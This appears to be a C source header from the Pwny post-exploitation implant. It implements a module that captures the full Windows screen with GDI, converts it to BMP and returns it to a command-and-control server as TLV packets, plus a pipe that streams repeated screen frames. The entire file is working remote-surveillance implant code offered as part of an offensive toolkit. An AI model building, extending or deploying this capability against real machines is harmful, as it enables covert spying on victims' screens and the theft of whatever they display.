/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _UI_H_
#define _UI_H_

#include <windows.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define UI_BASE 6

#define UI_SCREENSHOT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UI_BASE, \
                       API_CALL)

#define UI_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        UI_BASE, \
                        PIPE_TYPE)

static int bmp_to_buffer(HBITMAP hBitmap, HDC hDC, unsigned char **out, size_t *out_size)
{
    BITMAP bmp;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    DWORD dwBmpSize;
    HANDLE hDIB;
    char *lpbitmap;

    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;

    hDIB = GlobalAlloc(GHND, dwBmpSize);
    if (hDIB == NULL)
    {
        return -1;
    }

    lpbitmap = (char *)GlobalLock(hDIB);
    GetDIBits(hDC, hBitmap, 0, (UINT)bmp.bmHeight,
              lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;

    *out_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    *out = (unsigned char *)malloc(*out_size);

    if (*out == NULL)
    {
        GlobalUnlock(hDIB);
        GlobalFree(hDIB);
        return -1;
    }

    memcpy(*out, &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(*out + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    memcpy(*out + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpbitmap, dwBmpSize);

    GlobalUnlock(hDIB);
    GlobalFree(hDIB);

    return 0;
}

static tlv_pkt_t *ui_screenshot(c2_t *c2)
{
    /* Capture a screenshot of the primary display using GDI.
     *
     * :out bytes(TLV_TYPE_BYTES): BMP image data
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     */

    HDC hScreenDC;
    HDC hMemoryDC;
    HBITMAP hBitmap;
    HBITMAP hOldBitmap;

    int width;
    int height;

    unsigned char *bmp_data;
    size_t bmp_size;
    tlv_pkt_t *result;

    hScreenDC = GetDC(NULL);
    if (hScreenDC == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (hMemoryDC == NULL)
    {
        ReleaseDC(NULL, hScreenDC);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (width == 0 || height == 0)
    {
        width = GetDeviceCaps(hScreenDC, HORZRES);
        height = GetDeviceCaps(hScreenDC, VERTRES);
    }

    hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (hBitmap == NULL)
    {
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height,
           hScreenDC, GetSystemMetrics(SM_XVIRTUALSCREEN),
           GetSystemMetrics(SM_YVIRTUALSCREEN), SRCCOPY);

    SelectObject(hMemoryDC, hOldBitmap);

    bmp_data = NULL;
    bmp_size = 0;

    if (bmp_to_buffer(hBitmap, hMemoryDC, &bmp_data, &bmp_size) == 0 && bmp_data != NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, bmp_data, bmp_size);
        free(bmp_data);
    }
    else
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return result;
}

void register_ui_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, UI_SCREENSHOT, ui_screenshot);
}

static int ui_pipe_create(pipe_t *pipe, c2_t *c2)
{
    /* Nothing to initialise – each read captures a fresh frame */
    pipe->data = NULL;
    return 0;
}

static int ui_pipe_readall(pipe_t *pipe, void **buffer)
{
    HDC hScreenDC;
    HDC hMemoryDC;
    HBITMAP hBitmap;
    HBITMAP hOldBitmap;
    int width, height;
    unsigned char *bmp_data;
    size_t bmp_size;

    hScreenDC = GetDC(NULL);
    if (hScreenDC == NULL)
    {
        return -1;
    }

    hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (hMemoryDC == NULL)
    {
        ReleaseDC(NULL, hScreenDC);
        return -1;
    }

    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (width == 0 || height == 0)
    {
        width = GetDeviceCaps(hScreenDC, HORZRES);
        height = GetDeviceCaps(hScreenDC, VERTRES);
    }

    hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (hBitmap == NULL)
    {
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return -1;
    }

    hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height,
           hScreenDC, GetSystemMetrics(SM_XVIRTUALSCREEN),
           GetSystemMetrics(SM_YVIRTUALSCREEN), SRCCOPY);
    SelectObject(hMemoryDC, hOldBitmap);

    bmp_data = NULL;
    bmp_size = 0;

    if (bmp_to_buffer(hBitmap, hMemoryDC, &bmp_data, &bmp_size) != 0 || bmp_data == NULL)
    {
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return -1;
    }

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    *buffer = bmp_data;
    return (int)bmp_size;
}

static int ui_pipe_destroy(pipe_t *pipe, c2_t *c2)
{
    return 0;
}

void register_ui_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t callbacks;

    memset(&callbacks, 0, sizeof(callbacks));
    callbacks.create_cb = ui_pipe_create;
    callbacks.readall_cb = ui_pipe_readall;
    callbacks.destroy_cb = ui_pipe_destroy;

    api_pipe_register(pipes, UI_PIPE, callbacks);
}

#endif
